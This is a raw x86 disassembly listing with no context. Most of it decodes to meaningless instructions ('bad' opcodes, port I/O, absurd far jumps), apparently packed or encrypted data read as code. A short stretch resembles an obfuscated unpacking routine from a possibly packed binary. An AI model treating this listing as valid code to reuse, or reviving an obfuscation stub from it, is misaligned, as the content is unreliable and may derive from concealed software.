  405266:	(bad)  
  405267:	or     al,0x2f
  405269:	xchg   ebp,eax
  40526a:	(bad)
  40526d:	xchg   edi,eax
  40526e:	imul   ecx,DWORD PTR [edx-0xa],0xef88eaa3
  405275:	into   
  405276:	dec    eax
  405277:	push   ss
  405278:	pop    edx
  405279:	jmp    0x1a515f1e
  40527e:	mov    ds,WORD PTR [esi+ecx*1-0xc7a9d3b]
  405285:	mov    esi,0x2ca2dc31
  40528a:	inc    esp
  40528b:	stc    
  40528c:	inc    BYTE PTR [edx]
  40528e:	dec    esi
  40528f:	pushf  
  405290:	mov    ebx,0x3fc1ec87
  405295:	test   DWORD PTR [ecx-0x35297bd5],edi
  40529b:	cld    
  40529c:	sub    BYTE PTR [ecx],dh
  40529e:	cmc    
  40529f:	or     bh,BYTE PTR [edi]
  4052a1:	stos   DWORD PTR es:[edi],eax
  4052a2:	stos   DWORD PTR es:[edi],eax
  4052a3:	adc    cl,BYTE PTR [edi-0x51]
  4052a6:	aam    0x23
  4052a8:	imul   ecx,DWORD PTR [ebx+0x31],0x7a025530
  4052af:	call   0xe3a7d2e6
  4052b4:	xchg   ecx,eax
  4052b5:	xchg   ebp,eax
  4052b6:	jno    0x4052a1
  4052b8:	xchg   esp,eax
  4052b9:	call   0xc64a783b
  4052be:	jecxz  0x405257
  4052c0:	out    0xd3,al
  4052c2:	dec    ebx
  4052c3:	mov    ds:0xcb0e02bf,eax
  4052c8:	leave  
  4052c9:	clc    
  4052ca:	div    BYTE PTR [esi-0x51]
  4052cd:	int    0x35
  4052cf:	xchg   ebp,eax
  4052d0:	jno    0x4052aa
  4052d2:	jge    0x4052a2
  4052d4:	adc    eax,0x2dd09ef5
  4052d9:	ss sti 
  4052db:	push   ecx
  4052dc:	retf   
  4052dd:	pop    ecx
  4052de:	push   ds
  4052df:	xchg   edi,eax
  4052e0:	leave  
  4052e1:	ret    
  4052e2:	jp     0x4052bc
  4052e4:	outs   dx,BYTE PTR ds:[esi]
  4052e5:	sbb    edi,ecx
  4052e7:	scas   eax,DWORD PTR es:[edi]
  4052e8:	lods   eax,DWORD PTR ds:[esi]
  4052e9:	stos   BYTE PTR es:[edi],al
  4052ea:	repz jl 0x405283
  4052ed:	shl    DWORD PTR [ebx-0xa],0xc9
  4052f1:	cmp    eax,0x9295b3f2
  4052f6:	rol    BYTE PTR [eax-0x46],cl
  4052f9:	aaa    
  4052fa:	lods   al,BYTE PTR ds:[esi]
  4052fb:	sbb    BYTE PTR [esi-0x64],0x8
  4052ff:	call   0x3dc8:0xf0f577af
  405306:	call   0x82f4:0x7aa95591
  40530d:	jns    0x405327
  40530f:	push   edi
  405310:	outs   dx,DWORD PTR ds:[esi]
  405311:	xor    edx,edi
  405313:	loop   0x4052c2
  405315:	ins    BYTE PTR es:[edi],dx
  405316:	jl     0x40536e
  405318:	hlt    
  405319:	jmp    0x536d:0xe3c470f7
  405320:	or     ecx,DWORD PTR [ecx-0x4e2ca14d]
  405326:	clc    
  405327:	xchg   esi,eax
  405328:	jmp    0x405383
  40532a:	cmp    esp,edi
  40532c:	addr16 cmp al,0xd6
  40532f:	push   ebx
  405330:	push   edi
  405331:	js     0x405330
  405333:	inc    ecx
  405334:	and    ch,BYTE PTR [edi]
  405336:	jecxz  0x40535a
  405338:	mov    edx,0xd492645b
  40533d:	sbb    al,0xd4
  40533f:	dec    ebp
  405340:	cmp    ch,ch
  405342:	lahf   
  405343:	and    bl,BYTE PTR [eax-0x7d]
  405346:	mov    cl,0x13
  405348:	xor    BYTE PTR [eax+0xd],cl
  40534b:	adc    BYTE PTR [edi+0x64f4f0b3],al
  405351:	fldcw  WORD PTR [eax-0x4f]
  405354:	push   edx
  405355:	dec    edx
  405356:	mov    edi,DWORD PTR [esi-0x1e]
  405359:	xor    al,0xc
  40535b:	mov    esp,0xf992ae03
  405360:	shr    DWORD PTR [eax],1
  405362:	jmp    0x89553a40
  405367:	adc    al,ch
  405369:	repz rep outs dx,DWORD PTR gs:[esi]
  40536d:	ret    0x9161
  405370:	mov    ds:0x5247687b,eax
  405375:	mov    ds:0xea832170,eax
  40537a:	shl    BYTE PTR [ecx],0x5f
  40537d:	arpl   ax,sp
  40537f:	gs data16 stos BYTE PTR es:[edi],al
  405382:	inc    eax
  405383:	clc    
  405384:	sub    DWORD PTR [ebx-0x45415b96],eax
  40538a:	cmp    DWORD PTR [eax+ebx*1-0x52c4a68f],esp
  405391:	sbb    DWORD PTR [eax+0x16],esi
  405394:	mov    dh,0xe1
  405396:	and    eax,0x65e0e929
  40539b:	aas    
  40539c:	mov    dh,0xc1
  40539e:	cmp    eax,DWORD PTR [edi+0x13d8de77]
  4053a4:	das    
  4053a5:	call   0xd3443901
  4053aa:	adc    BYTE PTR [edi],al
  4053ac:	push   ecx
  4053ad:	sbb    edi,DWORD PTR [ebp+0x1ab8241c]
  4053b3:	add    edx,eax
  4053b5:	adc    al,0x89
  4053b7:	pop    ebx
  4053b8:	mov    edx,ebp
  4053ba:	or     DWORD PTR ds:0x1ecaebb,edx
  4053c0:	mov    dh,0xc6
  4053c2:	mov    al,ds:0xb5cec076
  4053c7:	cmp    ebp,DWORD PTR [ecx+0x52]
  4053ca:	push   0xffffff83
  4053cc:	cmc    
  4053cd:	cmp    BYTE PTR [esi+0x3a],dh
  4053d0:	jbe    0x40536c
  4053d2:	out    0xe9,al
  4053d4:	xchg   ecx,eax
  4053d5:	out    dx,al
  4053d6:	aas    
  4053d7:	mov    esi,0xcac6fe62
  4053dc:	js     0x40542e
  4053de:	push   ss
  4053df:	fadd   DWORD PTR [ecx-0x43]
  4053e2:	mov    BYTE PTR [eax+0x429d5be1],dl
  4053e8:	cld    
  4053e9:	jmp    0x4053c9
  4053eb:	mov    dl,0x2d
  4053ed:	mov    edi,es
  4053ef:	and    BYTE PTR [ecx-0x78],dh
  4053f2:	xadd   BYTE PTR [esi-0x5f76f18c],al
  4053f9:	push   edx
  4053fa:	cwde   
  4053fb:	jne    0x4053d7
  4053fd:	lods   al,BYTE PTR ds:[esi]
  4053fe:	mov    bl,0xb2
  405400:	psubd  mm4,QWORD PTR [ecx+0xd26dddb]
  405407:	or     BYTE PTR [edi-0x30],cl
  40540a:	fisttp WORD PTR [ebx-0x2039b624]
  405410:	into   
  405411:	mov    WORD PTR [esi-0x342f6f09],?
  405417:	aaa    
  405418:	jbe    0x4053ac
  40541a:	jmp    0xc5ee:0xd32c772d
  405421:	ins    DWORD PTR es:[edi],dx
  405422:	xchg   esi,eax
  405423:	aas    
  405424:	arpl   sp,bp
  405426:	shl    BYTE PTR [edx+0x14556743],cl
  40542c:	adc    DWORD PTR [ebp-0x4410e265],edi
  405432:	or     al,0x37
  405434:	xchg   BYTE PTR [ebx-0x9],al
  405437:	mov    eax,ds:0x21129f37
  40543c:	loope  0x405405
  40543e:	(bad)  
  40543f:	daa    
  405440:	or     al,0xf8
  405442:	dec    edi
  405443:	push   ecx
  405445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405446:	pusha  
  405447:	push   edx
  405448:	and    edi,0x23d31dc
  40544e:	inc    ecx
  40544f:	pop    eax
  405450:	loope  0x4053fe
  405452:	in     eax,dx
  405453:	in     al,dx
  405454:	bound  ecx,QWORD PTR [ebp-0x6d]
  405457:	fmul   st,st(0)
  405459:	hlt    
  40545a:	enter  0x759a,0x14
  40545e:	xchg   DWORD PTR [ebx],esp
  405460:	push   edx
  405461:	imul   edi,DWORD PTR [bp+di],0x55860ffa
  405468:	idiv   bh
  40546a:	dec    DWORD PTR [ebx+0x7d8bf455]
  405470:	fsub   st(1),st
  405472:	inc    BYTE PTR [edx]
  405474:	add    BYTE PTR [eax],al
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x12ac0448]
  405484:	sub    ebp,ebp
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x405420
  40548f:	mov    cl,0xe0
  405491:	ret    0xf779
  405494:	pop    esp
  405495:	sbb    DWORD PTR [ebx+0x1e],edx
  405498:	inc    ebp
  405499:	xor    BYTE PTR [edi-0x3ab0d705],0x34
  4054a0:	dec    esi
  4054a1:	test   DWORD PTR [ecx],ebx
  4054a3:	in     eax,0xc7
  4054a5:	les    esi,FWORD PTR [edi+0x4eb88a2c]
  4054ab:	cmc    
  4054ac:	repnz adc dl,bl
  4054af:	leave  
  4054b0:	xchg   esp,eax
  4054b1:	retf   0xb15d
  4054b4:	add    DWORD PTR [ebp-0x17955e89],0x7d6089b8
  4054be:	dec    ebx
  4054bf:	jno    0x4054b9
  4054c1:	cs popa 
  4054c3:	cmp    al,BYTE PTR [eax]
  4054c5:	sub    al,ch
  4054c7:	lods   al,BYTE PTR ds:[esi]
  4054c8:	add    eax,0x6d34d00c
  4054cd:	adc    cl,BYTE PTR [esi-0x57]
  4054d0:	pop    edx
  4054d1:	test   DWORD PTR [edx+0x7a],0x2696d5d
  4054d8:	bound  edi,QWORD PTR [esi-0x8]
  4054db:	push   esi
  4054dc:	add    edi,DWORD PTR gs:[eax+ebx*2-0xc]
  4054e1:	lock pop ds
  4054e3:	xchg   BYTE PTR [edx+0x27],bl
  4054e6:	xchg   BYTE PTR [ecx],cl
  4054e8:	ret    
  4054e9:	pop    ebp
  4054ea:	pop    eax
  4054eb:	and    eax,0xcc9338e8
  4054f0:	and    BYTE PTR [ebx],ch
  4054f2:	fdiv   DWORD PTR [ebx]
  4054f4:	add    al,0xfb
  4054f6:	inc    esp
  4054f7:	in     eax,dx
  4054f8:	daa    
  4054f9:	xlat   BYTE PTR ds:[ebx]
  4054fa:	adc    al,0x51
  4054fc:	mov    eax,ds:0xb205d159
  405501:	bound  ebx,QWORD PTR [esi-0x1aa7b15c]
  405507:	dec    esi
  405508:	push   esp
  405509:	inc    edx
  40550a:	fidiv  WORD PTR [edx]
  40550c:	(bad)  
  40550d:	sub    BYTE PTR [edi],ah
  40550f:	dec    esi
  405510:	mov    eax,0xe7b1547c
  405515:	ror    edi,1
  405517:	lods   al,BYTE PTR ds:[esi]
  405518:	and    DWORD PTR [edi+0x64915b3f],ebx
  40551e:	ds mov eax,0xd019a34d
  405524:	(bad)  
  405525:	icebp  
  405526:	cli    
  405527:	jp     0x4054c5
  405529:	frstor [ebx+edi*4]
  40552c:	xchg   ebp,eax
  40552d:	mov    ah,0xa4
  40552f:	(bad)  
  405530:	or     bl,BYTE PTR [ecx+0x1e4910e8]
  405536:	inc    esi
  405537:	bound  edi,QWORD PTR gs:[edx]
  40553a:	and    DWORD PTR [esi],edx
  40553c:	mov    bl,al
  40553e:	mov    ebp,0x53d7ddac
  405543:	loop   0x4055ab
  405545:	mov    bl,0xe2
  405547:	mov    fs,WORD PTR [edx-0xaeebb27]
  40554d:	rol    edi,cl
  40554f:	xor    bl,ch
  405551:	inc    esi
  405552:	xor    ecx,esi
  405554:	sub    DWORD PTR [ecx+0x3ea876d2],ebx
  40555a:	and    dl,BYTE PTR [edx]
  40555c:	leave  
  40555d:	lds    ecx,FWORD PTR [edx+eax*2]
  405560:	xor    DWORD PTR es:[eax+0x11],eax
  405564:	leave  
  405565:	icebp  
  405566:	sub    dl,BYTE PTR [eax+0x3ab7cd6b]
  40556c:	iret   
  40556d:	pop    eax
  40556e:	add    DWORD PTR ds:0x4f23312d,eax
  405574:	push   ecx
  405575:	sar    BYTE PTR [ebx],1
  405577:	inc    ebp
  405578:	sbb    eax,0x11645d4b
  40557d:	cmp    DWORD PTR [ebx-0x53],eax
  405580:	repnz inc ebx
  405582:	adc    BYTE PTR [esi-0x1e5eddc3],0xff
  405589:	sbb    al,0xb9
  40558b:	mov    BYTE PTR [ebx],cl
  40558d:	xchg   ebx,eax
  40558e:	jmp    0x405538
  405590:	imul   esp,DWORD PTR [ecx+0x48ed0198],0xbc89d27c
  40559a:	test   DWORD PTR [edx+0x49],ebx
  40559d:	xchg   ecx,eax
  40559e:	xor    al,0x5c
  4055a0:	mov    al,0x3a
  4055a2:	xchg   bl,ch
  4055a4:	scas   eax,DWORD PTR es:[edi]
  4055a5:	dec    ecx
  4055a6:	jge    0x4055ee
  4055a8:	xor    al,0x1
  4055aa:	jecxz  0x405540
  4055ac:	mov    ch,0x65
  4055ae:	pop    edi
  4055af:	jg     0x405592
  4055b1:	jns    0x4055a9
  4055b3:	cmp    BYTE PTR [edx],ah
  4055b5:	inc    ecx
  4055b6:	sbb    DWORD PTR [eax+0xf],eax
  4055b9:	mov    ebx,0x221c446f
  4055be:	nop
  4055bf:	shl    DWORD PTR ds:0xbfd5c269,1
  4055c5:	lods   al,BYTE PTR ds:[esi]
  4055c6:	sar    ecx,cl
  4055c8:	xchg   ecx,eax
  4055c9:	inc    ebx
  4055ca:	fsubr  DWORD PTR [edi-0x1ec039f9]
  4055d0:	or     ch,cl
  4055d2:	shl    DWORD PTR [edx+0x7e],cl
  4055d5:	mov    eax,ds:0xdfc5244f
  4055da:	ds test eax,0x2b675aa5
  4055e0:	leave  
  4055e1:	push   ss
  4055e2:	mov    WORD PTR [ecx-0x72],?
  4055e5:	adc    DWORD PTR [ecx-0x64],eax
  4055e8:	mov    ebx,0x62b60d37
  4055ed:	xchg   edx,eax
  4055ee:	or     eax,0x4e4875f7
  4055f3:	lahf   
  4055f4:	jg     0x40559e
  4055f6:	retf   0xae64
  4055f9:	(bad)  
  4055fa:	test   eax,0xe6a2d767
  4055ff:	neg    bl
  405601:	jnp    0x4055d4
  405603:	xor    al,0x3e
  405605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405606:	lahf   
  405607:	xchg   DWORD PTR [ebp+0x4],ebp
  40560a:	sub    al,0xa8
  40560c:	and    ebp,esp
  40560e:	mov    ebp,0xe55f8ff7
  405613:	sub    al,0x90
  405615:	fisttp QWORD PTR [eax]
  405617:	or     al,0xe6
  405619:	or     eax,0xdba788e0
  40561e:	jbe    0x4055e7
  405620:	or     dh,BYTE PTR [ebx]
  405622:	cs lahf 
  405624:	ins    DWORD PTR es:[edi],dx
  405625:	jne    0x405645
  405627:	mov    edx,0xbaca155e
  40562c:	adc    eax,0x3e55d210
  405631:	fiadd  WORD PTR [esp+edx*1]
  405634:	test   eax,0xbee47bfd
  405639:	(bad)  
  40563a:	aaa    
  40563b:	mov    al,0x54
  40563d:	(bad)  
  40563e:	ficom  WORD PTR ds:0x16d9f6f8
  405644:	popa   
  405645:	mov    gs,WORD PTR [esi]
  405647:	or     DWORD PTR ds:0x3d75d633,ebp
  40564d:	sti    
  40564e:	mov    eax,0x4d014711
  405653:	in     eax,dx
  405654:	jge    0x405642
  405656:	int    0xd4
  405658:	sbb    eax,0xc3a9ab16
  40565d:	xchg   esp,eax
  40565e:	lods   eax,DWORD PTR ds:[esi]
  40565f:	xor    eax,0x256c077c
  405664:	xchg   DWORD PTR [edi+0xa],edi
  405667:	mov    ebp,0xcf47e8b9
  40566c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40566d:	lods   eax,DWORD PTR ds:[esi]
  40566e:	jbe    0x40568f
  405670:	inc    ecx
  405671:	mov    bh,0x51
  405673:	out    dx,eax
  405674:	xchg   ebx,eax
  405675:	mov    WORD PTR [edi+0x64],ds
  405678:	sub    DWORD PTR ds:0x5d9cfdb3,ecx
  40567e:	jo     0x4056e4
  405680:	jmp    0x99ea:0x9fbe7e8a
  405687:	es xchg ebp,eax
  405689:	lock test bl,bl
  40568c:	rcr    DWORD PTR [edx],cl
  40568e:	es mov ebx,0x19f9c991
  405694:	mov    dl,0xb9
  405696:	sub    BYTE PTR ds:0x37cbd59d,ah
  40569c:	fistp  DWORD PTR [esi+ebp*1-0x17be1453]
  4056a3:	ret    
  4056a4:	int3   
  4056a5:	lea    edi,[edx+0x6db826f6]
  4056ab:	sti    
  4056ac:	mov    cl,0x9f
  4056ae:	xchg   esi,eax
  4056af:	dec    eax
  4056b0:	mov    bh,0x87
  4056b2:	inc    edx
  4056b3:	test   DWORD PTR [eax+0x7be3adb6],esi
  4056b9:	pop    ss
  4056ba:	bnd ret 
  4056bc:	(bad)  
  4056bd:	jno    0x4056f6
  4056bf:	xor    al,BYTE PTR [edi]
  4056c1:	mov    al,ds:0xa92fa1c7
  4056c6:	inc    edi
  4056c7:	call   0x5a8245bc
  4056cc:	mov    ds:0xa85b519c,eax
  4056d1:	daa    
  4056d2:	xor    eax,0x243b1dee
  4056d7:	xchg   edx,eax
  4056d8:	and    BYTE PTR [esi+0x6f],dl
  4056db:	mov    bl,0xb2
  4056dd:	imul   esp,ecx,0xffffffb6
  4056e0:	inc    eax
  4056e1:	jmp    0xc73334ba
  4056e6:	or     DWORD PTR [ebx+0x7b1f49a1],ebx
  4056ec:	mov    WORD PTR [ebp-0x79374edc],?
  4056f2:	adc    al,BYTE PTR [eax-0xe54c3d2]
  4056f8:	sahf   
  4056f9:	nop
  4056fa:	into   
  4056fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056fc:	outs   dx,BYTE PTR ds:[esi]
  4056fd:	ja     0x405682
  4056ff:	push   es
  405700:	cli    
  405701:	mov    esp,0xb239ca15
  405706:	sbb    DWORD PTR [edx+0x93b35c6],ebp
  40570c:	bound  esp,QWORD PTR [edi]
  40570e:	sub    eax,0x16080dc3
  405713:	mov    ebp,ebx
  405715:	dec    ebp
  405716:	sub    al,0x9
  405718:	sbb    esi,DWORD PTR [eax+0x1b]
  40571b:	push   ss
  40571c:	call   0xd6c8:0xb9713fe6
  405723:	call   0xc7b13596
  405728:	cmp    ah,BYTE PTR [edi+0x7e]
  40572b:	adc    ebx,edi
  40572d:	pop    eax
  40572e:	dec    esi
  40572f:	mov    edx,0xaf2178d7
  405734:	sbb    eax,DWORD PTR [eax+0x3c]
  405737:	rol    eax,0xc7
  40573a:	dec    esi
  40573b:	int3   
  40573c:	and    eax,0x83c0d888
  405741:	push   edi
  405742:	jo     0x4056da
  405744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405745:	mov    ds:0x811b1d2,al
  40574a:	in     al,dx
  40574b:	pushf  
  40574c:	sbb    BYTE PTR [ebx+ebx*8+0x72bbe474],dl
  405753:	pusha  
  405754:	shr    BYTE PTR [ecx-0x66aa6719],0x87
  40575b:	in     eax,0xe
  40575d:	lods   al,BYTE PTR ds:[esi]
  40575e:	xchg   bx,ax
  405760:	sub    bh,BYTE PTR ds:0x1fe0fe2c
  405766:	clc    
  405767:	jae    0x4057d0
  405769:	stos   BYTE PTR es:[edi],al
  40576a:	xchg   edx,eax
  40576b:	and    DWORD PTR [ecx+eiz*8],esi
  40576e:	cmp    BYTE PTR [ecx+0x22a7666d],0x33
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43389b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4337a3,0x433783
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4337df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x38
  4057f5:	push   ecx
  4057f6:	mov    eax,ds:0x7e363a21
  4057fb:	jle    0x405829
  4057fd:	jge    0x40587d
  4057ff:	jle    0x40579b
  405801:	ficomp WORD PTR [eax+0x43]
  405804:	xor    al,0x48
  405806:	arpl   bx,ax
  405808:	mov    ecx,0xb4c88a01
  40580d:	daa    
  40580e:	mov    edx,0x573fd8bf
  405813:	sbb    dh,BYTE PTR [edx]
  405815:	xor    eax,0x955d33c4
  40581a:	push   ecx
  40581b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40581c:	push   ecx
  40581d:	inc    esp
  40581e:	(bad)  
  40581f:	xor    edx,DWORD PTR [eax]
  405821:	out    0x55,eax
  405823:	adc    DWORD PTR [eax-0x26],esi
  405826:	adc    BYTE PTR [edi-0x6f39667f],al
  40582c:	pop    edi
  40582d:	test   BYTE PTR [edi-0x21],0x45
  405831:	call   0x3f39272c
  405836:	js     0x405824
  405838:	retf   
  405839:	mov    cl,0xf9
  40583b:	out    0xb9,al
  40583d:	in     eax,0x82
  40583f:	std    
  405840:	les    esi,FWORD PTR [edi]
  405842:	dec    ebp
  405843:	lods   al,BYTE PTR ds:[esi]
  405844:	jbe    0x4057de
  405846:	outs   dx,BYTE PTR ds:[esi]
  405847:	mov    dh,0x9f
  405849:	sbb    BYTE PTR [edi+0x66b25f16],0x5b
  405850:	mov    ds:0x355dfde4,eax
  405855:	mov    bh,0x9
  405857:	dec    ebp
  405858:	adc    eax,0x75f6a2c
  40585d:	mov    ?,WORD PTR [ebp+0x19]
  405860:	xchg   esp,eax
  405861:	dec    edx
  405862:	in     eax,0x61
  405864:	ret    0x10f5
  405867:	out    dx,eax
  405868:	imul   ebp,DWORD PTR [ebp*8-0x61f1e14d],0xd5e7839f
  405873:	mov    edx,0x62cf5102
  405878:	inc    WORD PTR [ecx]
  40587b:	ret    
  40587c:	sbb    cl,dl
  40587e:	xor    BYTE PTR [edx],ch
  405880:	sub    cl,ah
  405882:	xor    BYTE PTR [esi+0x4a1a8845],cl
  405888:	imul   ebx,ebp,0xffffffa3
  40588b:	or     al,0x9b
  40588d:	rcpps  xmm5,XMMWORD PTR [edi+0x40]
  405891:	sbb    ecx,edx
  405893:	pop    edx
  405894:	add    bh,BYTE PTR fs:[esi-0x3e]
  405898:	mov    esp,0xbb65d9d3
  40589d:	inc    eax
  40589e:	mov    eax,0x2afa4ff0
  4058a3:	xchg   DWORD PTR [ebx-0x77],ecx
  4058a6:	xor    dl,BYTE PTR [esi]
  4058a8:	test   al,0x5a
  4058aa:	fcomi  st,st(4)
  4058ac:	adc    eax,0xecd3e3d7
  4058b1:	aad    0x16
  4058b3:	cwde   
  4058b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058b5:	sub    ecx,DWORD PTR [ebp-0x44d19866]
  4058bb:	shl    DWORD PTR [ecx+0x27],1
  4058be:	je     0x405917
  4058c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058c1:	adc    al,0xda
  4058c3:	add    BYTE PTR [edi+0x79a534c4],ah
  4058c9:	jbe    0x4058ef
  4058cb:	mov    bl,0x6
  4058cd:	sbb    bl,bh
  4058cf:	mov    edx,0xcde4d2b
  4058d4:	loop   0x4058ea
  4058d6:	dec    edi
  4058d7:	cwde   
  4058d8:	adc    eax,0xdf5b100a
  4058dd:	shl    BYTE PTR [ecx+0x1c],0x15
  4058e1:	aaa    
  4058e2:	sbb    dl,BYTE PTR [ebx-0x63]
  4058e5:	fisubr DWORD PTR ss:[esi+0x40]
  4058e9:	test   BYTE PTR [edx+0x4a79bb6f],cl
  4058ef:	xchg   DWORD PTR [ebp+0x4abdfa39],ebp
  4058f5:	aad    0xb7
  4058f7:	ss (bad) 
  4058f9:	aas    
  4058fa:	into   
  4058fb:	mov    cl,0xcb
  4058fd:	pop    esi
  4058fe:	bound  ebp,QWORD PTR [edx+0xe7b1224]
  405904:	push   cs
  405905:	pop    esp
  405906:	push   0x736330ab
  40590b:	outs   dx,DWORD PTR ds:[esi]
  40590c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40590d:	cmp    ah,BYTE PTR [ecx-0x2d87b2a6]
  405913:	pop    ds
  405914:	adc    BYTE PTR [esi],0x7b
  405917:	jo     0x405901
  405919:	mov    dl,0x3b
  40591b:	outs   dx,DWORD PTR ds:[esi]
  40591c:	loopne 0x40591d
  40591e:	xchg   edx,eax
  40591f:	fcmove st,st(3)
  405921:	pushf  
  405922:	push   es
  405923:	push   ebx
  405924:	lahf   
  405925:	pop    ecx
  405926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405927:	imul   ecx,DWORD PTR [ecx],0x0
  40592a:	nop
  40592b:	(bad)  
  40592c:	loop   0x40599c
  40592e:	arpl   WORD PTR [edi+0x325a4013],bp
  405934:	pop    edx
  405935:	test   al,0x80
  405937:	imul   edx,DWORD PTR [edi+ecx*2],0x1
  40593b:	icebp  
  40593c:	pop    esi
  40593d:	adc    eax,0x7b2d91f
  405942:	jmp    0xc514:0x3b20100e
  405949:	pop    esp
  40594a:	mov    cs,ecx
  40594c:	shl    BYTE PTR [eax+0x2890d156],1
  405952:	push   es
  405953:	ja     0x4059bb
  405955:	js     0x4058eb
  405957:	out    0xc7,eax
  405959:	inc    edx
  40595a:	mov    esp,0xb1dc69e3
  40595f:	icebp  
  405960:	pop    eax
  405961:	jl     0x4059b0
  405963:	xor    bl,BYTE PTR [edi+eiz*2+0x39]
  405967:	retf   0x3a31
  40596a:	jmp    0x66a3:0x819ae058
  405971:	mov    esi,0x38d08006
  405976:	pop    ebp
  405977:	mov    edi,DWORD PTR [esi+0x68]
  40597a:	jne    0x40594b
  40597c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40597d:	icebp  
  40597e:	sub    eax,0x56c3bc20
  405983:	push   edi
  405984:	stos   DWORD PTR es:[edi],eax
  405985:	jmp    0x405915
  405987:	jns    0x4059e4
  405989:	addr16 clc 
  40598b:	loop   0x40591b
  40598d:	lock shr DWORD PTR [edi-0x2d],0xfd
  405992:	pop    eax
  405993:	ret    0x27f7
  405996:	ins    BYTE PTR es:[edi],dx
  405997:	out    dx,al
  405998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405999:	scas   al,BYTE PTR es:[edi]
  40599a:	and    ecx,ebp
  40599c:	add    DWORD PTR [edx-0x6af41b1a],edx
  4059a2:	cmp    al,0x98
  4059a4:	add    DWORD PTR [edi+ebx*1+0x19],esi
  4059a8:	sahf   
  4059a9:	add    esp,ecx
  4059ab:	je     0x405945
  4059ad:	ror    BYTE PTR [eax-0x17cde18f],0xa
  4059b4:	cs jbe 0x405a17
  4059b7:	loop   0x4059ba
  4059b9:	cmc    
  4059ba:	idiv   DWORD PTR [eax]
  4059bc:	cwde   
  4059bd:	jnp    0x4059e4
  4059bf:	sbb    esp,esp
  4059c1:	sub    eax,0xe94f3c14
  4059c7:	sub    al,0xaa
  4059c9:	and    bh,BYTE PTR [ecx-0x6ed7098d]
  4059cf:	pop    ebp
  4059d0:	sub    eax,0x65843a89
  4059d5:	out    dx,al
  4059d6:	(bad)  
  4059d7:	imul   ebx,DWORD PTR [ecx+0x5c],0xffffff8d
  4059db:	adc    DWORD PTR [edi+0x3e],ebx
  4059de:	int3   
  4059df:	jno    0x4059fd
  4059e1:	scas   eax,DWORD PTR es:[edi]
  4059e2:	or     eax,0x13549bbb
  4059e7:	repz mov esi,0x636550c5
  4059ed:	mov    cl,0xf0
  4059ef:	cwde   
  4059f0:	push   ecx
  4059f1:	outs   dx,BYTE PTR ds:[esi]
  4059f2:	inc    esp
  4059f3:	or     edi,DWORD PTR [ebx]
  4059f5:	or     DWORD PTR [esi],ecx
  4059f7:	outs   dx,BYTE PTR ds:[esi]
  4059f8:	scas   al,BYTE PTR es:[edi]
  4059f9:	mov    dl,0x4
  4059fb:	out    dx,eax
  4059fc:	lea    edi,[eax]
  4059fe:	or     BYTE PTR [eax-0x10],bl
  405a01:	jmp    0xf710:0x621b3c0d
  405a08:	inc    esi
  405a09:	repz mov al,ds:0x57fcc6d9
  405a0f:	jne    0x4059d9
  405a11:	ds aas 
  405a13:	jo     0x4059e6
  405a15:	and    eax,0xf8491702
  405a1a:	push   cs
  405a1b:	bnd jae 0x405a20
  405a1e:	pop    ebx
  405a1f:	sbb    esp,ebx
  405a21:	fistp  QWORD PTR [edi+0x47c1a9bb]
  405a27:	jno    0x405a4e
  405a29:	add    DWORD PTR [esi-0x35dc116],ebx
  405a2f:	in     eax,0x93
  405a31:	xor    DWORD PTR [edx-0x79],0x1f45ceb4
  405a38:	xor    edx,ebp
  405a3a:	scas   al,BYTE PTR es:[edi]
  405a3b:	jle    0x4059d8
  405a3d:	sub    cl,BYTE PTR [esi-0x58]
  405a40:	xor    DWORD PTR [ecx+ebp*8],edi
  405a43:	mov    ah,0xb8
  405a45:	in     al,0x53
  405a47:	push   ss
  405a48:	ja     0x405a22
  405a4a:	sub    DWORD PTR [ecx],esi
  405a4c:	jbe    0x405ac0
  405a4e:	clc    
  405a4f:	popa   
